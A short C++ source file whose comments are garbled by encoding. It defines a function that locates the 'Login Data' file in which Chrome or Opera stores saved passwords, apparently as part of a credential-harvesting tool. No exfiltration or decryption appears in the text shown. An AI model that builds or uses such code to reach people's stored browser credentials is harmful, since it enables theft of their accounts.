#include "getLoginData.h"

using namespace std;

//���ڲ����û���Ϣ�ļ��洢��·��������ֵΪ·����Ϣ�򱨴���Ϣ
string findLoginData(char* name) {
	char* localAppDataPath = (char*)malloc(sizeof(char) * MAX_PATH);
	string LoginDataPath;

	if (name == CHROME) {
		if (localAppDataPath != NULL) {
			if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, 0, NULL, localAppDataPath) != S_OK) return FIND_DATA_FAIL;//��ȡappData��LocalĿ¼
			LoginDataPath = localAppDataPath;
			free(localAppDataPath);
			localAppDataPath = nullptr;

			LoginDataPath += "\\Google\\Chrome\\User Data\\Default\\Login Data";
			return LoginDataPath;
		}
	}
	else if (name == OPERA) {
		if (localAppDataPath != NULL) {
			if (SHGetFolderPathA(NULL, CSIDL_APPDATA, 0, NULL, localAppDataPath) != S_OK) return FIND_DATA_FAIL;//��ȡappData��RoamingĿ¼
			LoginDataPath = localAppDataPath;
			free(localAppDataPath);
			localAppDataPath = nullptr;

			LoginDataPath += "\\Opera Software\\Opera Stable\\Login Data";
			return LoginDataPath;
		}
	}


	return FIND_DATA_FAIL;
}